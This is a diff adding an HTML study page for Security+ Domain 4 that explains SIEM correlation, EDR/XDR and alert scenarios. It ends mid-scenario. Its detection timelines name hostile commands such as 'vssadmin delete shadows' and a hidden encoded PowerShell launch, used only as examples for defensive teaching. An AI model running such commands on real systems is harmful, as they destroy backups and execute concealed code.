@@ -1,0 +1,1716 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Alerting & Monitoring — Security+ Domain 4</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Roboto+Mono:wght@400;500;600&display=swap');
+
+:root {
+  --bg:#07080f;
+  --s1:#0d0f1a;
+  --s2:#131525;
+  --s3:#1a1d30;
+  --border:#252840;
+  --text:#dde0f5;
+  --muted:#6870a8;
+  --blue:#4da6ff;
+  --green:#3ddc97;
+  --red:#ff6b6b;
+  --orange:#ffaa44;
+  --purple:#b87dff;
+  --teal:#2de8d8;
+  --yellow:#ffd166;
+  --pink:#ff77b5;
+  --indigo:#7c8bff;
+  --cyan:#44e3ff;
+}
+
+*{margin:0;padding:0;box-sizing:border-box;}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:'Space Grotesk',sans-serif;
+  font-size:14px;
+  line-height:1.65;
+  padding:2rem 1.5rem;
+}
+
+.title{
+  font-size:2rem;
+  font-weight:700;
+  text-align:center;
+  letter-spacing:-0.02em;
+  margin-bottom:0.25rem;
+  color:var(--text);
+}
+.title span{color:var(--teal);}
+.sub{
+  text-align:center;
+  font-family:'Roboto Mono',monospace;
+  font-size:0.7rem;
+  color:var(--muted);
+  margin-bottom:2rem;
+}
+
+/* TABS */
+.tabs{display:flex;flex-wrap:wrap;gap:0.35rem;justify-content:center;margin-bottom:2rem;}
+.tab{
+  padding:0.42rem 0.9rem;
+  border-radius:8px;
+  border:1px solid var(--border);
+  background:var(--s1);
+  color:var(--muted);
+  cursor:pointer;
+  font-family:'Roboto Mono',monospace;
+  font-size:0.66rem;
+  font-weight:500;
+  transition:all 0.15s;
+}
+.tab:hover{border-color:var(--teal);color:var(--teal);}
+.tab.active{background:var(--teal);color:#07080f;border-color:var(--teal);font-weight:700;}
+
+/* SECTIONS */
+.sec{display:none;}
+.sec.on{display:block;animation:up 0.2s ease;}
+@keyframes up{from{opacity:0;transform:translateY(5px);}to{opacity:1;transform:none;}}
+
+/* CARD */
+.card{background:var(--s1);border:1px solid var(--border);border-radius:14px;margin-bottom:1.5rem;overflow:hidden;}
+.card-hd{display:flex;align-items:center;gap:0.8rem;padding:1.1rem 1.4rem;border-bottom:1px solid var(--border);}
+.card-num{font-family:'Roboto Mono',monospace;font-size:0.6rem;color:var(--muted);background:var(--s2);border:1px solid var(--border);border-radius:4px;padding:0.15rem 0.4rem;}
+.card-title{font-size:1.1rem;font-weight:700;letter-spacing:-0.01em;}
+.bdg{margin-left:auto;font-family:'Roboto Mono',monospace;font-size:0.6rem;padding:0.18rem 0.6rem;border-radius:999px;white-space:nowrap;font-weight:600;}
+.bdg-blue{background:#0f2a4a;color:var(--blue);border:1px solid #1a3f6f;}
+.bdg-green{background:#0a2d1a;color:var(--green);border:1px solid #154028;}
+.bdg-orange{background:#2d1a08;color:var(--orange);border:1px solid #4a2d10;}
+.bdg-red{background:#2d0f0f;color:var(--red);border:1px solid #4a1515;}
+.bdg-purple{background:#1e0f3d;color:var(--purple);border:1px solid #2d1a5a;}
+.bdg-teal{background:#082820;color:var(--teal);border:1px solid #103830;}
+.bdg-indigo{background:#131a4a;color:var(--indigo);border:1px solid #1e2870;}
+.bdg-yellow{background:#2d2208;color:var(--yellow);border:1px solid #4a3510;}
+.bdg-cyan{background:#082030;color:var(--cyan);border:1px solid #104560;}
+
+.card-bd{padding:1.4rem;}
+p{color:var(--muted);font-size:0.86rem;margin-bottom:0.8rem;}
+h3{font-size:0.92rem;font-weight:700;color:var(--text);margin:1.2rem 0 0.6rem;padding-left:0.7rem;border-left:3px solid var(--teal);}
+
+/* CODE */
+.code{
+  background:#04050a;
+  border:1px solid var(--border);
+  border-radius:8px;
+  padding:1rem 1.2rem;
+  font-family:'Roboto Mono',monospace;
+  font-size:0.7rem;
+  line-height:1.85;
+  color:var(--text);
+  overflow-x:auto;
+  margin:0.8rem 0;
+}
+.cg{color:var(--green);} .cr{color:var(--red);} .cb{color:var(--blue);}
+.co{color:var(--orange);} .cp{color:var(--purple);} .cm{color:var(--muted);}
+.ct{color:var(--teal);} .ci{color:var(--indigo);} .cy{color:var(--yellow);}
+.cpk{color:var(--pink);} .cc{color:var(--cyan);}
+
+/* SCENE */
+.scene{background:#1a1200;border-left:3px solid var(--orange);border-radius:0 8px 8px 0;padding:1rem 1.2rem;margin:1rem 0;}
+.scene-lbl{font-family:'Roboto Mono',monospace;font-size:0.6rem;color:var(--orange);margin-bottom:0.5rem;letter-spacing:0.06em;font-weight:700;}
+
+/* GRIDS */
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:0.8rem;margin:0.8rem 0;}
+.g3{display:grid;grid-template-columns:repeat(3,1fr);gap:0.8rem;margin:0.8rem 0;}
+.g4{display:grid;grid-template-columns:repeat(4,1fr);gap:0.7rem;margin:0.8rem 0;}
+@media(max-width:640px){.g2,.g3,.g4{grid-template-columns:1fr;}}
+
+.gc{background:var(--s2);border:1px solid var(--border);border-radius:10px;padding:1rem;}
+.gc h4{font-size:0.85rem;font-weight:700;margin-bottom:0.4rem;}
+.gc p{font-size:0.77rem;margin:0;}
+.gc ul{padding-left:1rem;margin-top:0.3rem;}
+.gc ul li{font-size:0.76rem;color:var(--muted);margin-bottom:0.25rem;}
+
+/* EXAM */
+.exam{background:#130f2a;border:1px solid #2d1a5a;border-radius:10px;padding:1rem 1.2rem;margin-top:1rem;}
+.exam h4{font-family:'Roboto Mono',monospace;font-size:0.6rem;color:var(--purple);margin-bottom:0.6rem;letter-spacing:0.06em;font-weight:700;}
+.er{display:flex;gap:0.5rem;margin-bottom:0.4rem;font-size:0.79rem;align-items:flex-start;}
+.ek{color:var(--purple);font-family:'Roboto Mono',monospace;font-size:0.67rem;flex-shrink:0;font-weight:700;}
+
+/* TABLE */
+table{width:100%;border-collapse:collapse;font-size:0.78rem;}
+th{background:var(--s2);padding:0.55rem 0.8rem;text-align:left;color:var(--muted);border-bottom:1px solid var(--border);font-size:0.7rem;font-weight:700;font-family:'Roboto Mono',monospace;}
+td{padding:0.55rem 0.8rem;border-bottom:1px solid var(--border);}
+tr:last-child td{border-bottom:none;}
+tr:hover td{background:var(--s2);}
+
+.tag{display:inline-block;padding:0.1rem 0.45rem;border-radius:4px;font-size:0.62rem;font-family:'Roboto Mono',monospace;font-weight:700;}
+.tg{background:#0a2d1a;color:var(--green);}
+.tr{background:#2d0f0f;color:var(--red);}
+.tb{background:#0f2a4a;color:var(--blue);}
+.to{background:#2d1a08;color:var(--orange);}
+.tp{background:#1e0f3d;color:var(--purple);}
+.tt{background:#082820;color:var(--teal);}
+.ti{background:#131a4a;color:var(--indigo);}
+.ty{background:#2d2208;color:var(--yellow);}
+.tc{background:#082030;color:var(--cyan);}
+
+/* INFO ROW */
+.info-row{display:flex;align-items:flex-start;gap:0.8rem;padding:0.8rem 1rem;background:var(--s2);border:1px solid var(--border);border-radius:8px;margin-bottom:0.5rem;}
+.info-icon{font-size:1.1rem;flex-shrink:0;margin-top:0.1rem;}
+.info-title{font-size:0.85rem;font-weight:700;margin-bottom:0.15rem;}
+.info-desc{font-size:0.75rem;color:var(--muted);}
+
+/* TOOL CARD */
+.tool-card{background:var(--s2);border:1px solid var(--border);border-radius:12px;padding:1.2rem;margin-bottom:0.8rem;}
+.tool-hd{display:flex;align-items:center;gap:0.8rem;margin-bottom:0.6rem;}
+.tool-icon{font-size:1.3rem;flex-shrink:0;}
+.tool-name{font-size:0.95rem;font-weight:700;}
+.tool-type{font-family:'Roboto Mono',monospace;font-size:0.62rem;color:var(--muted);background:var(--s3);padding:0.15rem 0.5rem;border-radius:4px;margin-left:auto;}
+.tool-desc{font-size:0.8rem;color:var(--muted);margin-bottom:0.6rem;}
+.tool-examples{display:flex;flex-wrap:wrap;gap:0.3rem;}
+.tool-ex{font-family:'Roboto Mono',monospace;font-size:0.62rem;padding:0.15rem 0.5rem;background:var(--s3);border:1px solid var(--border);border-radius:4px;color:var(--text);}
+
+/* ALERT LEVELS */
+.alert-row{display:flex;align-items:center;gap:1rem;padding:0.7rem 0.9rem;border-radius:8px;margin-bottom:0.4rem;border:1px solid;}
+.alert-icon{font-size:1.1rem;flex-shrink:0;}
+.alert-name{font-weight:700;font-size:0.85rem;min-width:90px;}
+.alert-desc{font-size:0.77rem;color:var(--muted);flex:1;}
+.alert-action{font-family:'Roboto Mono',monospace;font-size:0.65rem;white-space:nowrap;}
+
+/* METRIC CARDS */
+.metric-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:0.6rem;margin:1rem 0;}
+@media(max-width:600px){.metric-grid{grid-template-columns:1fr 1fr;}}
+.metric-card{background:var(--s2);border:1px solid var(--border);border-radius:10px;padding:1rem;text-align:center;}
+.metric-val{font-family:'Roboto Mono',monospace;font-size:1.5rem;font-weight:700;margin-bottom:0.2rem;}
+.metric-lbl{font-size:0.7rem;color:var(--muted);}
+
+/* FLOW */
+.flow{display:flex;align-items:center;flex-wrap:wrap;gap:0.4rem;margin:1rem 0;}
+.flow-box{border-radius:8px;padding:0.55rem 0.8rem;font-size:0.72rem;font-weight:600;border:1px solid;text-align:center;min-width:85px;}
+.flow-arr{color:var(--muted);font-size:1rem;}
+
+/* ACTIVITY TYPES */
+.activity-item{display:flex;gap:1rem;padding:0.8rem 0;border-bottom:1px solid var(--border);}
+.activity-item:last-child{border-bottom:none;}
+.activity-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0;margin-top:5px;}
+.activity-title{font-size:0.85rem;font-weight:700;margin-bottom:0.2rem;}
+.activity-desc{font-size:0.77rem;color:var(--muted);}
+</style>
+</head>
+<body>
+
+<div class="title">Alerting <span>&</span> Monitoring</div>
+<p class="sub">// Domain 4 — Security Operations · Tools · Activities · Detection · Response</p>
+
+<div class="tabs">
+  <button class="tab active" onclick="go('s1',this)">1. Overview</button>
+  <button class="tab" onclick="go('s2',this)">2. SIEM</button>
+  <button class="tab" onclick="go('s3',this)">3. EDR / XDR</button>
+  <button class="tab" onclick="go('s4',this)">4. Network Tools</button>
+  <button class="tab" onclick="go('s5',this)">5. Log Management</button>
+  <button class="tab" onclick="go('s6',this)">6. Alert Types</button>
+  <button class="tab" onclick="go('s7',this)">7. Computing Activities</button>
+  <button class="tab" onclick="go('s8',this)">8. SOAR & Automation</button>
+  <button class="tab" onclick="go('s9',this)">📊 Summary</button>
+</div>
+
+<!-- ══════════════════════════ -->
+<!-- 1. OVERVIEW               -->
+<!-- ══════════════════════════ -->
+<div class="sec on" id="s1">
+<div class="card">
+  <div class="card-hd"><span class="card-num">01</span><span class="card-title">Alerting & Monitoring Overview</span><span class="bdg bdg-teal">Visibility · Detection</span></div>
+  <div class="card-bd">
+    <p>Monitoring is the <strong style="color:var(--text)">continuous collection and analysis of data</strong> from systems, networks, and applications to detect threats, anomalies, and policy violations. Alerting is the mechanism that <strong style="color:var(--text)">notifies the right people</strong> when something suspicious is found.</p>
+
+    <h3>The Core Problem Monitoring Solves</h3>
+    <div class="code">
+<span class="cm"># Without monitoring — you're flying blind:</span>
+Attacker enters network:             You don't know
+Attacker moves laterally for weeks:  You don't know
+Attacker exfiltrates 50GB of data:   You don't know
+Attacker leaves backdoor:            You don't know
+
+Average time to detect a breach (industry stats):
+  Without monitoring: <span class="cr">207 days (6.9 months!)</span>
+  With monitoring:    <span class="cg">days to hours</span>
+
+Average cost difference:
+  Breach detected quickly: <span class="cg">$3.05M average</span>
+  Breach detected late:    <span class="cr">$4.86M average</span>
+  Monitoring ROI: obvious
+
+<span class="cm"># With monitoring — you see everything:</span>
+Attacker enters network:             <span class="cg">ALERT — unusual login</span>
+Attacker moves laterally:            <span class="cg">ALERT — lateral movement detected</span>
+Attacker tries to exfiltrate:        <span class="cg">ALERT — large data transfer blocked</span>
+    </div>
+
+    <h3>Monitoring Principles</h3>
+    <div class="g3">
+      <div class="gc">
+        <h4 style="color:var(--teal)">Continuous — Not Periodic</h4>
+        <p>Attacks happen at 3am Sunday. Monitoring must run 24/7/365. Not a weekly check — continuous real-time analysis. SOC (Security Operations Center) staffed around the clock or MDR (Managed Detection & Response) service used.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--blue)">Centralized Collection</h4>
+        <p>All logs from all sources sent to central platform (SIEM). Logs on local systems can be deleted by attackers — central logs much harder to tamper with. Single pane of glass for analysts.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--green)">Baseline First</h4>
+        <p>Must know what "normal" looks like before detecting "abnormal." Baselines built over time — normal login hours, normal traffic volume, normal data transfer rates. Deviations from baseline = alerts.</p>
+      </div>
+    </div>
+
+    <h3>Monitoring Architecture — What Feeds What</h3>
+    <div class="code">
+<span class="cm"># Data sources → Collection → Analysis → Alert → Response</span>
+
+DATA SOURCES:
+  Endpoints:    EDR agents → process, file, network activity
+  Network:      Firewalls, switches, routers, IDS/IPS → traffic
+  Identity:     Active Directory, IAM → logons, privilege use
+  Applications: Web servers, DBs, apps → access, errors
+  Cloud:        AWS CloudTrail, Azure Monitor → API calls
+  Email:        Gateway logs → spam, phishing, attachments
+  Physical:     Badge readers, cameras → physical access
+
+COLLECTION:
+  Syslog (UDP 514 / TCP 6514 encrypted) → SIEM
+  Agent-based → EDR platform
+  API integration → Cloud security tools
+  NetFlow → Network monitoring
+
+ANALYSIS:
+  Correlation rules → known attack patterns
+  Behavioral analytics → baseline deviations (UEBA)
+  Threat intelligence → known bad IPs/domains/hashes
+  ML/AI → anomaly detection
+
+ALERT → ANALYST → RESPONSE
+    </div>
+
+    <h3>Key Monitoring Tool Categories</h3>
+    <div class="g4">
+      <div class="gc">
+        <h4 style="color:var(--blue)">SIEM</h4>
+        <p>Central log collection + correlation. Heart of security monitoring. Covered in Tab 2.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--green)">EDR/XDR</h4>
+        <p>Endpoint behavior monitoring + response. Covered in Tab 3.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">Network Tools</h4>
+        <p>IDS/IPS, NetFlow, packet capture. Covered in Tab 4.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--purple)">Log Management</h4>
+        <p>Collect, store, analyze logs. Covered in Tab 5.</p>
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// EXAM KEYWORDS</h4>
+      <div class="er"><span class="ek">Monitoring purpose →</span><span>Detect threats, anomalies, policy violations — continuous not periodic</span></div>
+      <div class="er"><span class="ek">Baseline →</span><span>Know normal before detecting abnormal — deviation triggers alerts</span></div>
+      <div class="er"><span class="ek">Centralized logging →</span><span>SIEM collects all sources — harder to tamper than local logs</span></div>
+      <div class="er"><span class="ek">SOC →</span><span>Security Operations Center — team that monitors 24/7</span></div>
+      <div class="er"><span class="ek">MDR →</span><span>Managed Detection and Response — outsourced SOC service</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════ -->
+<!-- 2. SIEM                   -->
+<!-- ══════════════════════════ -->
+<div class="sec" id="s2">
+<div class="card">
+  <div class="card-hd"><span class="card-num">02</span><span class="card-title">SIEM — Security Information and Event Management</span><span class="bdg bdg-blue">Heart of SOC</span></div>
+  <div class="card-bd">
+    <p>SIEM is the <strong style="color:var(--text)">central platform that collects logs from every source, correlates events across them, and generates alerts</strong> when suspicious patterns emerge. It's the single pane of glass for security monitoring — the brain of a SOC.</p>
+
+    <h3>What SIEM Does — Core Functions</h3>
+    <div class="g2">
+      <div class="gc">
+        <h4 style="color:var(--blue)">Log Collection & Aggregation</h4>
+        <p>Ingests logs from: firewalls, servers, workstations, network devices, cloud services, applications, identity systems. Normalizes different log formats into common schema. Thousands of events per second from hundreds of sources — all in one place.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--teal)">Correlation Engine</h4>
+        <p>Applies rules that look for patterns ACROSS multiple log sources simultaneously. One failed login = noise. 100 failed logins across 50 accounts in 10 minutes = password spraying alert. SIEM connects dots humans can't connect at scale.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">Alerting</h4>
+        <p>Generates alerts when correlation rules trigger. Prioritizes by severity. Routes to right team. Integrates with ticketing systems. Can page on-call analyst for critical alerts. Reduces noise — only alert on meaningful events.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--green)">Dashboards & Visualization</h4>
+        <p>Real-time security dashboards. Geographic maps of login origins. Top threat sources. Event timeline for investigations. Customizable per audience — executive vs analyst views.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--purple)">Historical Analysis</h4>
+        <p>Search historical logs for investigation. "Show me all events from this IP address in last 90 days." Forensic timeline reconstruction. Threat hunting — proactively search for hidden attackers.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--red)">Compliance Reporting</h4>
+        <p>Pre-built compliance reports: PCI-DSS, HIPAA, SOX, ISO 27001. Evidence of monitoring for auditors. Retention policies ensure logs kept for required period. Automated report generation.</p>
+      </div>
+    </div>
+
+    <h3>SIEM Correlation — The Magic</h3>
+    <div class="code">
+<span class="cm"># Single events that look harmless:</span>
+Event 1 (AD):    john.smith failed login at 02:14
+Event 2 (VPN):   Connection from Bucharest, Romania at 02:15
+Event 3 (File):  john.smith accessed finance share at 02:17
+Event 4 (Email): john.smith forwarded 500 emails to gmail at 02:19
+Event 5 (DLP):   Large data upload blocked from john.smith at 02:21
+
+<span class="cm"># Each event alone: maybe nothing</span>
+<span class="cm"># SIEM correlates ALL FIVE → pattern:</span>
+<span class="cr">CRITICAL ALERT: Possible Account Compromise + Data Exfiltration</span>
+  → Failed login (credential testing)
+  → Foreign country access (impossible travel?)
+  → Sensitive file access (lateral movement)
+  → Email forwarding (exfil attempt)
+  → DLP block (exfil stopped)
+  → All within 7 minutes → automated attacker behavior
+
+<span class="cm"># Analyst action: disable john.smith account immediately</span>
+<span class="cm"># Investigation: was john.smith actually in Romania?</span>
+    </div>
+
+    <h3>SIEM Products — Must Know</h3>
+
+    <div class="tool-card">
+      <div class="tool-hd"><span class="tool-icon">🔍</span><span class="tool-name">Splunk</span><span class="tool-type">Industry Leader</span></div>
+      <div class="tool-desc">Most widely deployed enterprise SIEM. Powerful search query language (SPL — Splunk Processing Language). Highly flexible and customizable. Huge ecosystem of apps and integrations. Expensive but extremely capable. Standard for large enterprises.</div>
+      <div class="tool-examples"><span class="tool-ex">Splunk Enterprise</span><span class="tool-ex">Splunk Cloud</span><span class="tool-ex">Splunk ES</span></div>
+    </div>
+
+    <div class="tool-card">
+      <div class="tool-hd"><span class="tool-icon">🔷</span><span class="tool-name">Microsoft Sentinel</span><span class="tool-type">Cloud-Native SIEM</span></div>
+      <div class="tool-desc">Cloud-native SIEM built on Azure. Tight integration with Microsoft 365, Azure AD, Defender suite. Pay-per-use pricing. Built-in SOAR capabilities. Best for Microsoft-heavy environments. Growing rapidly in enterprise adoption.</div>
+      <div class="tool-examples"><span class="tool-ex">Azure Sentinel</span><span class="tool-ex">Microsoft 365 Defender</span></div>
+    </div>
+
+    <div class="tool-card">
+      <div class="tool-hd"><span class="tool-icon">📊</span><span class="tool-name">IBM QRadar</span><span class="tool-type">Enterprise SIEM</span></div>
+      <div class="tool-desc">Enterprise-grade SIEM with built-in threat intelligence. Strong network flow analysis capabilities. Deep integration with IBM security portfolio. Common in financial services and government sectors.</div>
+      <div class="tool-examples"><span class="tool-ex">QRadar SIEM</span><span class="tool-ex">QRadar XDR</span></div>
+    </div>
+
+    <div class="tool-card">
+      <div class="tool-hd"><span class="tool-icon">🦅</span><span class="tool-name">LogRhythm / Exabeam</span><span class="tool-type">Mid-Market</span></div>
+      <div class="tool-desc">Strong UEBA (User and Entity Behavior Analytics) built in. Exabeam known for automated investigation timelines. LogRhythm popular in mid-market. Both include smart analytics beyond basic rule matching.</div>
+      <div class="tool-examples"><span class="tool-ex">LogRhythm SIEM</span><span class="tool-ex">Exabeam Fusion</span></div>
+    </div>
+
+    <div class="tool-card">
+      <div class="tool-hd"><span class="tool-icon">🔓</span><span class="tool-name">Elastic SIEM / OpenSearch</span><span class="tool-type">Open Source</span></div>
+      <div class="tool-desc">Free/open source option built on Elasticsearch. Elastic Stack (ELK) = Elasticsearch + Logstash + Kibana. Highly customizable. Lower licensing cost. Requires more technical expertise to operate. Popular in DevSecOps environments.</div>
+      <div class="tool-examples"><span class="tool-ex">Elasticsearch</span><span class="tool-ex">Kibana</span><span class="tool-ex">Logstash</span></div>
+    </div>
+
+    <h3>SIEM Deployment Models</h3>
+    <div class="g3">
+      <div class="gc">
+        <h4 style="color:var(--blue)">On-Premises</h4>
+        <p>SIEM servers deployed in your data center. You manage everything. Maximum control. High upfront cost. Requires skilled staff. Data stays on-premises — good for regulated industries.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--teal)">Cloud-Native</h4>
+        <p>SIEM as a service — Microsoft Sentinel, Sumo Logic. No hardware. Scales automatically. Pay-per-use. Fastest to deploy. Modern choice for cloud-first orgs.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">Hybrid</h4>
+        <p>Log collection on-premises, analysis in cloud — or vice versa. Sensitive logs stay on-prem, cloud logs go to cloud SIEM. Balances control with scalability.</p>
+      </div>
+    </div>
+
+    <div class="scene">
+      <div class="scene-lbl">// SCENARIO — SIEM Detects Ransomware Deployment</div>
+      <div class="code">
+<span class="cm"># Saturday 11:47 PM — SOC analyst on duty:</span>
+
+<span class="cr">CRITICAL ALERT — Splunk — Possible Ransomware Activity</span>
+Correlation rule triggered: "Ransomware Precursor Pattern"
+
+Contributing events (last 45 minutes):
+<span class="co">23:02</span> ENDPOINT: <span class="cr">PowerShell execution — encoded command</span>
+         Host: WORKSTATION-047, User: mktg_user
+<span class="co">23:05</span> NETWORK:  <span class="cr">Connection to known C2 IP 45.131.209.14</span>
+<span class="co">23:11</span> ENDPOINT: <span class="cr">Shadow copy deletion (vssadmin delete shadows)</span>
+<span class="co">23:18</span> ENDPOINT: <span class="cr">Lateral movement via PsExec to 12 servers</span>
+<span class="co">23:29</span> ENDPOINT: <span class="cr">Mass file rename (.locked extension)</span>
+<span class="co">23:34</span> ENDPOINT: <span class="cr">Ransom note dropped (README.txt)</span>
+
+<span class="cb">Analyst response (23:34):</span>
+  → Isolate WORKSTATION-047 from network immediately
+  → Block C2 IP on firewall
+  → Alert incident response team + management
+  → Initiate DR/backup recovery procedures
+  → Disconnect affected servers from network
+
+<span class="cg">SIEM value: detected in minutes, not days ✓</span>
+<span class="cg">Timeline preserved for forensic investigation ✓</span>
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// EXAM KEYWORDS</h4>
+      <div class="er"><span class="ek">SIEM →</span><span>Central log correlation — detects patterns across multiple sources</span></div>
+      <div class="er"><span class="ek">Splunk →</span><span>Most widely deployed enterprise SIEM — SPL query language</span></div>
+      <div class="er"><span class="ek">Microsoft Sentinel →</span><span>Cloud-native SIEM — Azure-based — best for Microsoft environments</span></div>
+      <div class="er"><span class="ek">Correlation →</span><span>Multiple events together reveal attack — single events look innocent</span></div>
+      <div class="er"><span class="ek">SIEM vs logs →</span><span>SIEM correlates logs from many sources — much more than just log storage</span></div>
+      <div class="er"><span class="ek">ELK Stack →</span><span>Elasticsearch + Logstash + Kibana — open source SIEM alternative</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════ -->
+<!-- 3. EDR / XDR              -->
+<!-- ══════════════════════════ -->
+<div class="sec" id="s3">
+<div class="card">
+  <div class="card-hd"><span class="card-num">03</span><span class="card-title">EDR, MDR, and XDR</span><span class="bdg bdg-green">Endpoint · Extended · Managed</span></div>
+  <div class="card-bd">
+    <p>EDR — <strong style="color:var(--text)">Endpoint Detection and Response</strong> — goes far beyond traditional antivirus. It monitors endpoint behavior continuously, detects threats by what they DO not just what they are, and can automatically respond to contain threats.</p>
+
+    <h3>EDR vs Traditional Antivirus</h3>
+    <div class="code">
+<span class="cm"># Traditional Antivirus — signature based:</span>
+New malware arrives on endpoint
+AV scans: checks against signature database
+New malware: <span class="cr">NO SIGNATURE → PASSES THROUGH ✗</span>
+Malware executes: damage done
+Detection: only after signature update (days/weeks later)
+
+<span class="cg"># EDR — behavior based:</span>
+New malware arrives on endpoint
+EDR: doesn't check signature — watches BEHAVIOR
+Malware starts executing:
+  → Spawns cmd.exe from Word ← suspicious
+  → Reads sensitive file ← suspicious
+  → Makes outbound connection ← suspicious
+  → Tries to disable AV ← VERY suspicious
+EDR: "<span class="co">This behavior pattern = malware</span>"
+EDR response: <span class="cg">KILL PROCESS + QUARANTINE + ALERT ✓</span>
+Result: stopped BEFORE damage done
+        zero-day malware stopped by behavior
+    </div>
+
+    <h3>What EDR Monitors on Each Endpoint</h3>
+    <div class="g2">
+      <div class="gc">
+        <h4 style="color:var(--green)">Process Activity</h4>
+        <ul>
+          <li>Every process created — parent/child relationships</li>
+          <li>Process injection detection</li>
+          <li>Unusual process spawning (Word → PowerShell)</li>
+          <li>Command line arguments recorded</li>
+          <li>Process memory analysis</li>
+          <li>DLL loading and injection</li>
+        </ul>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--blue)">File System Activity</h4>
+        <ul>
+          <li>File creation, modification, deletion</li>
+          <li>Executable file drops</li>
+          <li>Mass file modification (ransomware indicator)</li>
+          <li>Shadow copy deletion attempts</li>
+          <li>Sensitive file access patterns</li>
+          <li>File hash comparison to threat intel</li>
+        </ul>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">Network Activity</h4>
+        <ul>
+          <li>All outbound connections from endpoint</li>
+          <li>DNS queries made by processes</li>
+          <li>Connections to known-bad IP/domains</li>
+          <li>Unusual port usage</li>
+          <li>Data volume transferred</li>
+          <li>C2 callback patterns</li>
+        </ul>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--purple)">Registry & System</h4>
+        <ul>
+          <li>Registry modifications (persistence mechanisms)</li>
+          <li>Startup item additions</li>
+          <li>Service creation and modification</li>
+          <li>Scheduled task creation</li>
+          <li>User account changes</li>
+          <li>Security tool tampering attempts</li>
+        </ul>
+      </div>
+    </div>
+
+    <h3>EDR Response Actions</h3>
+    <div class="code">
+<span class="cm"># EDR can respond automatically or give analyst options:</span>
+
+<span class="cb">Automated responses:</span>
+Kill process:       terminate malicious process immediately
+Quarantine file:    move to sandboxed location, isolate from system
+Block hash:         prevent file with same hash from running again
+Network isolation:  cut endpoint from network (keep EDR connection)
+                    → analyst can still investigate remotely!
+
+<span class="cb">Manual analyst actions via EDR console:</span>
+Live response:      run commands on remote endpoint
+Memory dump:        capture RAM for forensic analysis
+File retrieval:     pull specific files for analysis
+Timeline view:      see everything that happened hour by hour
+Threat hunting:     search across ALL endpoints simultaneously
+                    "Show me every endpoint that ran this process"
+                    "Find all endpoints that contacted this IP"
+    </div>
+
+    <h3>EDR Products</h3>
+    <div class="g2">
+      <div class="gc">
+        <h4 style="color:var(--blue)">CrowdStrike Falcon</h4>
+        <p>Industry leader. Cloud-native — agent sends telemetry to cloud for analysis. Extremely lightweight agent. Threat intelligence built in. Fastest detection in industry benchmarks. Used by many Fortune 500 companies.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--teal)">Microsoft Defender for Endpoint</h4>
+        <p>Built into Windows — no separate agent for Windows endpoints. Tight Azure/Sentinel integration. Excellent value for Microsoft shops. Included in Microsoft 365 E5 licensing. Coverage for non-Windows too.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">SentinelOne</h4>
+        <p>Strong autonomous response capabilities. Can operate without cloud connection. Rollback feature: can reverse ransomware encryption using Volume Shadow Service. Real-time AI-based detection.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--purple)">Carbon Black (VMware)</h4>
+        <p>Strong in regulated industries. On-premises deployment option. Behavioral detection with threat hunting capabilities. Good for organizations that can't send endpoint data to cloud.</p>
+      </div>
+    </div>
+
+    <h3>MDR — Managed Detection and Response</h3>
+    <div class="info-row">
+      <div class="info-icon">🏢</div>
+      <div>
+        <div class="info-title" style="color:var(--orange)">What Is MDR?</div>
+        <div class="info-desc">MDR = Outsourced SOC + EDR/SIEM. Organization subscribes to MDR service — provider deploys their tools AND provides 24/7 analyst monitoring. They alert YOU when something is found and help with response. Perfect for organizations that can't staff a full SOC. Examples: CrowdStrike Complete, Arctic Wolf, Rapid7 MDR.</div>
+      </div>
+    </div>
+
+    <h3>XDR — Extended Detection and Response</h3>
+    <div class="code">
+<span class="cm"># XDR = EDR + network + cloud + email + identity — unified</span>
+
+EDR alone sees:    only endpoint behavior
+NIDS alone sees:   only network traffic
+Email security:    only email threats
+Cloud security:    only cloud activity
+
+<span class="ct">XDR correlates ALL of these:</span>
+Email: suspicious attachment → user opened it (email layer)
+EDR:   PowerShell spawned after opening (endpoint layer)
+Network: callback to C2 server (network layer)
+Cloud:  credential used to access cloud (identity layer)
+
+<span class="cg">XDR unified alert: "Multi-stage attack in progress"</span>
+<span class="cg">Single console — full attack chain visible ✓</span>
+
+XDR products:
+  Palo Alto Cortex XDR
+  Microsoft Defender XDR (formerly M365 Defender)
+  CrowdStrike Falcon Platform
+  Trend Micro Vision One
+    </div>
+
+    <div class="scene">
+      <div class="scene-lbl">// SCENARIO — EDR Stops Fileless Malware</div>
+      <div class="code">
+<span class="cm"># Fileless malware — no file on disk — traditional AV misses it</span>
+
+08:43 AM — User opens phishing email attachment (Word doc)
+08:43 AM — Word opens → runs embedded macro
+08:43 AM — Macro executes PowerShell:
+           <span class="cr">powershell.exe -enc [base64 payload] -nop -w hidden</span>
+08:43 AM — PowerShell loads malware into RAM only
+           (nothing written to disk — AV has nothing to scan)
+
